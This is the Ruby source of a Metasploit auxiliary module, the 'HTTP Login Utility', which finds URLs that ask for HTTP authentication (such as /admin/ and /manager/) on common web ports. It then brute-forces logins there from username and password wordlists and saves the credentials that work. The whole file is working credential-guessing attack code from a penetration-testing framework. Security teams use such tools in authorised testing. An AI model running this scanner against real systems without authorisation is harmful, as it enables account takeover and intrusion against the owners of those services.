##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'rex/proto/ntlm/message'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/http'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'HTTP Login Utility',
      'Description'    => 'This module attempts to authenticate to an HTTP service.',
      'References'  =>
        [

        ],
      'Author'         => [ 'hdm' ],
      'References'     =>
        [
          [ 'CVE', '1999-0502'] # Weak password
        ],
      'License'        => MSF_LICENSE,
      # See https://dev.metasploit.com/redmine/issues/8814
      #'DefaultOptions' => {
      #  'USERPASS_FILE' => File.join(Msf::Config.data_directory, "wordlists", "http_default_userpass.txt"),
      #  'USER_FILE' => File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt"),
      #  'PASS_FILE' => File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt"),
      #}
    )

    register_options(
      [
        OptPath.new('USERPASS_FILE',  [ false, "File containing users and passwords separated by space, one pair per line",
          File.join(Msf::Config.data_directory, "wordlists", "http_default_userpass.txt") ]),
        OptPath.new('USER_FILE',  [ false, "File containing users, one per line",
          File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt") ]),
        OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
          File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt") ]),
        OptString.new('AUTH_URI', [ false, "The URI to authenticate against (default:auto)" ]),
        OptString.new('REQUESTTYPE', [ false, "Use HTTP-GET or HTTP-PUT for Digest-Auth, PROPFIND for WebDAV (default:GET)", "GET" ])
      ], self.class)
    register_autofilter_ports([ 80, 443, 8080, 8081, 8000, 8008, 8443, 8444, 8880, 8888 ])
  end

  def find_auth_uri

    if datastore['AUTH_URI'].present?
      paths = [datastore['AUTH_URI']]
    else
      paths = %W{
        /
        /admin/
        /auth/
        /manager/
        /Management.asp
      }
    end

    paths.each do |path|
      res = send_request_cgi({
        'uri'     => path,
        'method'  => datastore['REQUESTTYPE'],
        'username' => '',
        'password' => ''
      }, 10)

      next unless res
      if res.redirect? && res.headers['Location'] && res.headers['Location'] !~ /^http/
        path = res.headers['Location']
        vprint_status("Following redirect: #{path}")
        res = send_request_cgi({
          'uri'     => path,
          'method'  => datastore['REQUESTTYPE'],
          'username' => '',
          'password' => ''
        }, 10)
        next if not res
      end
      next unless res.code == 401

      return path
    end

    return nil
  end

  def target_url
    proto = "http"
    if rport == 443 or ssl
      proto = "https"
    end
    "#{proto}://#{rhost}:#{rport}#{@uri.to_s}"
  end

  def run_host(ip)
    if (datastore['REQUESTTYPE'] == "PUT") && (datastore['AUTH_URI'].blank?)
      print_error("You need need to set AUTH_URI when using PUT Method !")
      return
    end
    @uri = find_auth_uri
    if ! @uri
      print_error("#{target_url} No URI found that asks for HTTP authentication")
      return
    end

    @uri = "/#{@uri}" if @uri[0,1] != "/"

    print_status("Attempting to login to #{target_url}")

    cred_collection = Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file: datastore['PASS_FILE'],
      password: datastore['PASSWORD'],
      user_file: datastore['USER_FILE'],
      userpass_file: datastore['USERPASS_FILE'],
      username: datastore['USERNAME'],
      user_as_pass: datastore['USER_AS_PASS'],
    )

    cred_collection = prepend_db_passwords(cred_collection)

    scanner = Metasploit::Framework::LoginScanner::HTTP.new(
      host: ip,
      port: rport,
      uri: @uri,
      method: datastore['REQUESTTYPE'],
      proxies: datastore["PROXIES"],
      cred_details: cred_collection,
      stop_on_success: datastore['STOP_ON_SUCCESS'],
      connection_timeout: 5,
      user_agent: datastore['UserAgent'],
      vhost: datastore['VHOST']
    )

    msg = scanner.check_setup
    if msg
      print_brute :level => :error, :ip => ip, :msg => "Verification failed: #{msg}"
      return
    end

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
          module_fullname: self.fullname,
          workspace_id: myworkspace_id
      )
      case result.status
      when Metasploit::Model::Login::Status::SUCCESSFUL
        print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}'"
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)
        :next_user
      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
        print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
        invalidate_login(credential_data)
        :abort
      when Metasploit::Model::Login::Status::INCORRECT
        print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
        invalidate_login(credential_data)
      end
    end

  end


end
